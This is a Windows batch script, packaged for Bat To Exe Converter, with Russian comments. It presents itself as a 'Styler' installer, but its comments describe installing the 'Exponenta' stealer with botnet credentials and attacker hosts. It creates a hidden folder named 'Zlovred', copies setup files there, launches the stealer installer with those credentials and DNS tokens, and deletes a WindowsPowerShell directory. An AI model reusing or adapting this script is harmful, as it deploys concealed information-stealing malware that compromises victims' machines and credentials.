::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWGveyGYMIBpXRwGQA36pA6cP1Of36u2Uq0Ehcfovd4He1KCPHMkd+VHleZoS5W5DlM4eQhlZanI=
::fBE1pAF6MU+EWGveyGYMIBpXRwGQA36pA6cP1Of36u2Uq0Ehcfovd4He1KCPHOkd+VHleZoS5W5DlM4eQhJWd3I=
::fBE1pAF6MU+EWGveyGYMIBpXRwGQA36pA6cP1Of36u2Uq0Ehcfovd4He1KCPHOkd+VHleZoS5W5DlM4eCBJLagCibEE2qHoi
::fBE1pAF6MU+EWGveyGYMIBpXRwGQA36pA6cP1Of36u2Uq0Ehcfovd4He1KCPHMUL+krqcJg510lOgccJHihdage7IAosrA4=
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdD2DJH24/EMzIx5GcxGROXmpOroQ7e/o5ua7h1UNW+w6dpva5pGWMO8d70vwdKU503tWndk/CQ9NblyudgpU
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
rem Файл установки стайлера (Академический вариант)
rem USAGE
rem > load_Stylerdistrib.bat
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
rem set Hacker_User=%1
rem set Hacker_Pass=%2
rem set Hacker_host2=%3
rem set Hacker_host3=%4

rem Обновляем перемсенные окружения
call "C:\ProgramData\chocolatey\bin\RefreshEnv.cmd"

rem Читаем настройки из файла settings.txt, который должен располагаться в
rem том же каталоге, что и bat-файл. Если не удалось распарсить настройки -
rem выходим с ненулевым кодом возврата.
call :read_settings %~dp0\install_Styler.ini || exit /b 1

rem Create target Directory
md %PUB1%\Distrib\Zlovred
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\Zlovred


rem Go to Temprorary Directory
cd /d %curdir%

rem Настраиваем переменные окружения для команды Wget

rem Определяем переменные:

rem Локальный каталог
set LocalFolder=%PUB1%\Distrib\Zlovred

rem Копируем wget и запускаем установку в каталоге %LocalFolder%
copy ExponentaStylerSetup.exe %LocalFolder%\
copy install_Styler.ini %LocalFolder%\
copy install_Stylerdistrib.bat %LocalFolder%\
copy Install_Styler.bat %LocalFolder%\


rem Запускаем инсталлятор Stealer "Экспонента"
call install_Styler.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %hldnstoken% %entrydnstoken%
cd /d %curdir%

rem Удаляем временный каталог
rd /S /Q WindowsPowerShell

rem Выход из сценария. Дальше - только функции.
exit /b 0

rem
rem Функция для чтения настроек из файла.
rem Вход:
rem       %1           - Имя файла с настройками
:read_settings

set SETTINGSFILE=%1

rem Проверка существования файла
if not exist %SETTINGSFILE% (
    echo FAIL: Файл с настройками отсутствует
    exit /b 1
)

rem Обработка файла c настройками
rem Здесь:
rem     eol=# указывает на то, что содержимое строки начиная с символа #
rem     и до ее конца может быть пропущено как комментарий.
rem
rem     delims== указывает, что разделителем значений является символ =
rem
rem     tokens=1,2 приводит к тому, что в переменную %%i будет занесен первый
rem     токен, а в %%j - второй.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem В переменной i - ключ
    rem В переменной j - значение
    rem Мы транслируем это в переменные окружения
    set %%i=%%j
)
exit /b 0

